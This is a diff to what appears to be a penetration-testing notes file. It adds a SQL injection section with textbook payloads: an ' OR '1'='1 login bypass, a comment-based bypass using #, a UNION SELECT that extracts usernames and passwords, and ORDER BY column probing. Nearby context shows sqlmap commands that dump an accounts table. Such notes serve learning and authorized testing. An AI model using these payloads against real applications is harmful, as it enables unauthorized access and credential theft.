@@ -3,7 +3,52 @@
 - [mssqlclient.py](#msspy)
 
 ## SQL INJECTION <a name="sqli"></a>
+*MySQL SQL Injection cheat sheet:* https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+*Oracle SQL Injection cheat sheet:* https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
+*PostgreSQL SQL Injection cheat sheet:* https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet
+### Classic SQL Injection
+This is the most common type of SQL injection, where an attacker injects malicious SQL code into an application's input fields, typically through user inputs like forms or URL parameters.
 
+```bash
+' OR '1'='1
+```
+If the application does not properly sanitize input, the SQL query might look like this:
+```bash
+SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'password';
+```
+
+Also, you can use **#** . The **#** character is used for commenting. So, if the line responsible for the login is: 
+````bash
+SELECT * FROM users WHERE user=\$user AND password=\$password
+```` 
+When we login on the page and enter user=Kill-9 and password=123, the executed statement will be: 
+````bash
+SELECT * FROM users WHERE user='Kill-9' AND password=$123
+````
+ If we input:
+ ````bash
+ user=Kill-9'#'
+````
+The statement will be: 
+````bash
+SELECT * FROM users WHERE user='Kill-9'# AND password=$123
+```` 
+The commented part is not processed, granting us access.
+
+
+### Union-Based SQL Injection
+In a union-based SQL injection, the attacker leverages the UNION SQL operator to combine results from the original query with results from their injected query.
+An attacker might inject SQL code like this:
+```bash
+' UNION SELECT null, username, password FROM users --
+```
+
+### Determine the number of columns
+If we have an injectable parameter and we want to know how many columns does the database have, we can execute:
+```bash
+' order+by+<number>--
+```
+When it causes a *500* response that means that there are not "number" columns
 ### SQLmap
 SQLmap is an open-source tool used in penetration testing to detect and exploit SQL  injection flaws. SQLmap automates the process of detecting and exploiting SQL  injection. SQL Injection attacks can take control of databases that utilize SQL.
 
@@ -43,25 +88,6 @@ If we needed authentication to access to the web we will need to add the cookies
 		sqlmap -r pc -p id -D SQLite_masterdb -T accounts --columns 
 		sqlmap -r pc -p id -D SQLite_masterdb -T accounts --batch --threads 5 --dump```
 
-
-### '#'
-The **#** character is used for commenting. So, if the line responsible for the login is: 
-````bash
-SELECT * FROM users WHERE user=\$user AND password=\$password
-```` 
-When we login on the page and enter user=Kill-9 and password=123, the executed statement will be: 
-````bash
-SELECT * FROM users WHERE user='Kill-9' AND password=$123
-````
- If we input:
- ````bash
- user=Kill-9'#'
-````
-The statement will be: 
-````bash
-SELECT * FROM users WHERE user='Kill-9'# AND password=$123
-```` 
-The commented part is not processed, granting us access.
 
 ## MySQL <a name="mysql"></a>
 
